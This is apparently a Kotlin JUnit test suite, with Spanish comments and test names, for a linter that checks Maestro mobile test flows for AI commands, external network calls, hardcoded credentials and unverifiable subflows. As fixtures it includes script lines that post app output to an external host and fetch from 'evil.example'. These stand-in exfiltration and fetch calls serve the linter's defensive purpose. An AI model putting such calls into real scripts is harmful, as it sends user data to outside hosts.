package testigo.policy

import org.junit.jupiter.api.Assertions.assertEquals
import org.junit.jupiter.api.Assertions.assertFalse
import org.junit.jupiter.api.Assertions.assertTrue
import org.junit.jupiter.api.Test
import org.junit.jupiter.api.io.TempDir
import java.nio.file.Path
import kotlin.io.path.createDirectories
import kotlin.io.path.writeText

class FlowLinterTest {

    @TempDir
    lateinit var tmp: Path

    private fun file(relative: String, text: String): Path =
        tmp.resolve(relative).also {
            it.parent.createDirectories()
            it.writeText(text.trimIndent() + "\n")
        }

    private fun lint(vararg flows: Path) = FlowLinter().lint(flows.toList())

    @Test
    fun `una suite que respeta la politica pasa y revisa subflows y scripts`() {
        file(
            "flows/subflows/login.yaml",
            """
            appId: com.empresa.app
            ---
            - tapOn:
                id: "input_password"
            - inputText: ${'$'}{PASSWORD}
            """,
        )
        file("flows/scripts/hook.js", "http.get('http://127.0.0.1:8765/start')")
        val flow = file(
            "flows/perfil/actualizar_datos.yaml",
            """
            appId: com.empresa.app
            name: actualizar_datos
            tags: [perfil, smoke]
            ---
            - launchApp:
                clearState: true
            - runFlow:
                file: ../subflows/login.yaml
                env:
                  USER: ${'$'}{USER}
                  PASSWORD: ${'$'}{PASSWORD}
            - runScript: ../scripts/hook.js
            - tapOn:
                id: "input_telefono"
            - inputText: "999888777"
            """,
        )

        val result = lint(flow)

        assertTrue(result.passed, result.violations.toString())
        assertEquals(emptyList<FlowProblem>(), result.problems)
        assertEquals(3, result.checkedFiles.size, result.checkedFiles.toString())
    }

    @Test
    fun `un comando de IA es violacion con su archivo y linea`() {
        val flow = file(
            "flows/con_ia.yaml",
            """
            appId: com.empresa.app
            tags: [smoke]
            ---
            - launchApp
            - assertWithAI:
                assertion: "Se ve la pantalla de inicio"
            """,
        )

        val violation = lint(flow).violations.single()

        assertEquals(PolicyRule.AI_COMMAND, violation.rule)
        assertEquals(flow, violation.file)
        assertEquals(5, violation.line)
    }

    @Test
    fun `detecta comandos de IA sin argumentos y en los hooks del header`() {
        val flow = file(
            "flows/hooks.yaml",
            """
            appId: com.empresa.app
            onFlowComplete:
              - extractTextWithAI: "total"
            ---
            - launchApp
            - assertNoDefectsWithAI
            """,
        )

        val result = lint(flow)

        assertEquals(listOf(PolicyRule.AI_COMMAND, PolicyRule.AI_COMMAND), result.violations.map { it.rule })
        assertEquals(listOf(3, 6), result.violations.map { it.line })
    }

    @Test
    fun `una violacion dentro de un subflow se reporta en el subflow`() {
        val subflow = file("flows/subflows/verificar.yaml", "appId: com.empresa.app\n---\n- assertWithAI: \"todo bien\"")
        val flow = file("flows/caso.yaml", "appId: com.empresa.app\n---\n- runFlow: subflows/verificar.yaml")

        val violation = lint(flow).violations.single()

        assertEquals(subflow, violation.file)
        assertEquals(3, violation.line)
    }

    @Test
    fun `http hacia un host externo en un script o en una expresion`() {
        file("flows/enviar.js", "var a = 1\nhttp.post('https://api.externa.example/log', { body: output.total })")
        val flow = file(
            "flows/caso.yaml",
            """
            appId: com.empresa.app
            ---
            - runScript:
                file: enviar.js
            - inputText: ${'$'}{http.get('https://evil.example').body}
            """,
        )

        val result = lint(flow)

        assertEquals(listOf(PolicyRule.EXTERNAL_NETWORK, PolicyRule.EXTERNAL_NETWORK), result.violations.map { it.rule })
        assertEquals(listOf("enviar.js:2", "caso.yaml:5"), result.violations.map { "${it.file.fileName}:${it.line}" })
    }

    @Test
    fun `una credencial en env es violacion y el mensaje no muestra el valor`() {
        val flow = file(
            "flows/caso.yaml",
            """
            appId: com.empresa.app
            env:
              API_KEY: abc123
            ---
            - runFlow:
                file: subflows/login.yaml
                env:
                  USER: qa@example.com
                  PASSWORD: Secreto123
            """,
        )
        file("flows/subflows/login.yaml", "appId: com.empresa.app\n---\n- back")

        val violations = lint(flow).violations

        assertEquals(listOf(PolicyRule.CREDENTIAL, PolicyRule.CREDENTIAL), violations.map { it.rule })
        assertEquals(listOf(3, 9), violations.map { it.line })
        assertFalse(violations.any { "Secreto123" in it.message || "abc123" in it.message }, violations.toString())
    }

    @Test
    fun `texto fijo en un campo de contrasena es violacion`() {
        val flow = file(
            "flows/caso.yaml",
            """
            appId: com.empresa.app
            ---
            - tapOn:
                id: "input_email"
            - inputText: "qa@example.com"
            - tapOn: "Contraseña"
            - eraseText
            - inputText: "Secreto123"
            """,
        )

        val violation = lint(flow).violations.single()

        assertEquals(PolicyRule.CREDENTIAL, violation.rule)
        assertEquals(8, violation.line)
        assertFalse("Secreto123" in violation.message, violation.message)
    }

    @Test
    fun `un token escrito en el flow es violacion`() {
        val jwt = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U"
        val flow = file("flows/caso.yaml", "appId: com.empresa.app\n---\n- inputText: \"$jwt\"")

        assertEquals(listOf(PolicyRule.CREDENTIAL), lint(flow).violations.map { it.rule })
    }

    @Test
    fun `lo que no se puede revisar tambien bloquea`() {
        val flow = file(
            "flows/caso.yaml",
            """
            appId: com.empresa.app
            ---
            - runFlow: subflows/no_existe.yaml
            - runFlow: ${'$'}{SUBFLOW}
            """,
        )

        val result = lint(flow)

        assertEquals(listOf(PolicyRule.UNVERIFIABLE, PolicyRule.UNVERIFIABLE), result.violations.map { it.rule })
        assertEquals(listOf(3, 4), result.violations.map { it.line })
    }

    @Test
    fun `un YAML invalido no se puede revisar`() {
        val flow = file("flows/caso.yaml", "appId: com.empresa.app\n---\n- tapOn: [sin cerrar")

        assertEquals(listOf(PolicyRule.UNVERIFIABLE), lint(flow).violations.map { it.rule })
    }

    @Test
    fun `subflows que se llaman entre si se revisan una sola vez`() {
        val a = file("flows/a.yaml", "appId: com.empresa.app\n---\n- runFlow: b.yaml")
        file("flows/b.yaml", "appId: com.empresa.app\n---\n- runFlow: a.yaml")

        val result = lint(a)

        assertTrue(result.passed, result.violations.toString())
        assertEquals(2, result.checkedFiles.size)
    }

    @Test
    fun `un subflow sin configuracion no es violacion pero Maestro no lo acepta y se sugiere el appId de quien lo llama`() {
        // Como el de un usuario: Maestro falla con "Config Section Required" antes de ejecutar nada.
        val subflow = file("flows/subflows/login_flow.yaml", "# login\n- tapOn:\n    id: username_input\n- inputText: demo")
        val flow = file(
            "flows/test_login.yaml",
            "appId: com.example.myapplication\nname: Prueba de Login\n---\n- launchApp\n- runFlow:\n    file: subflows/login_flow.yaml",
        )

        val result = lint(flow)

        assertTrue(result.passed, result.violations.toString())
        val problem = result.problems.single()
        assertEquals(subflow, problem.file)
        assertEquals(null, problem.line)
        assertTrue("también en los subflows" in problem.message, problem.message)
        assertEquals("Agrega al inicio:", problem.fix)
        assertEquals(listOf("appId: com.example.myapplication", "---"), problem.snippet)
    }

    @Test
    fun `sin appId, sin separador o vacio tambien se detecta y se sugiere el appId que se indique`() {
        val sinAppId = file("flows/a.yaml", "# caso\nname: Sin appId\ntags: [smoke]\n---\n- launchApp")
        val sinComandos = file("flows/b.yaml", "appId: com.empresa.app\ntags: [smoke]")
        val vacio = file("flows/c.yaml", "# por hacer")
        val conUrl = file("flows/d.yaml", "url: https://localhost:3000\n---\n- launchApp")
        val sinComandosTrasSeparador = file("flows/e.yaml", "appId: com.empresa.app\n---\n# luego")

        val result = FlowLinter().lint(listOf(sinAppId, sinComandos, vacio, conUrl, sinComandosTrasSeparador), appId = "com.empresa.app.qa")

        assertEquals(listOf(sinAppId, sinComandos, vacio, sinComandosTrasSeparador), result.problems.map { it.file })
        assertEquals(listOf(2, null, null, null), result.problems.map { it.line })
        assertEquals(listOf("appId: com.empresa.app.qa"), result.problems[0].snippet)
        assertTrue("le falta el --- y los comandos" in result.problems[1].message, result.problems[1].message)
        assertEquals(listOf("appId: com.empresa.app.qa", "---", "- launchApp"), result.problems[2].snippet)
        assertEquals("no tiene comandos después del ---", result.problems[3].message)
        assertTrue(result.passed, result.violations.toString())
    }

    @Test
    fun `sin appId indicado se sugiere el de otro flow y si no hay ninguno un marcador`() {
        val sinConfig = file("flows/a.yaml", "- launchApp")
        val otro = file("flows/b.yaml", "appId: com.empresa.app\n---\n- launchApp")

        assertEquals(listOf("appId: com.empresa.app", "---"), lint(sinConfig, otro).problems.single().snippet)
        assertEquals(listOf("appId: ${FlowLinter.PLACEHOLDER_APP_ID}", "---"), lint(sinConfig).problems.single().snippet)
    }
}
